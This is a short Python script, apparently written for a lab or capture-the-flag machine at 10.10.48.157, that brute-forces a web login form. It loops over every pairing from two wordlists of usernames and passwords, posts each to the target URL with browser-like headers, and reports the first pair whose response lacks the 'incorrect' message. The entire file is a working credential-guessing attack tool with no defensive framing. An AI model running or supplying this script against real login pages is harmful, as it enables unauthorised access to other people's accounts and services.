#!/usr/bin/env python3

import requests
import sys

try:
	url = sys.argv[1]
except:
	print("[*] Usage: python3 BurpAlt.py <http://IP>/login")
	sys.exit()

users = [ x.strip() for x in open('users3.txt', 'r', encoding='utf-8') if x ]
passwords = [ x.strip() for x in open('passwords3.txt', 'r', encoding='utf-8') if x ]

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'http://10.10.48.157/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://10.10.48.157',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}


for user in users:
	for password in passwords:
		print('[*] Trying Combination: ' + user + ":" + password)
		data = {
  		'username': user,
  		'password': password
		}

		response = requests.post(url, headers=headers, data=data)
		if "Your password is incorrect.." not in response.text:
			print("[+] Valid Combination Found: " + user + ":" + password)
			sys.exit()

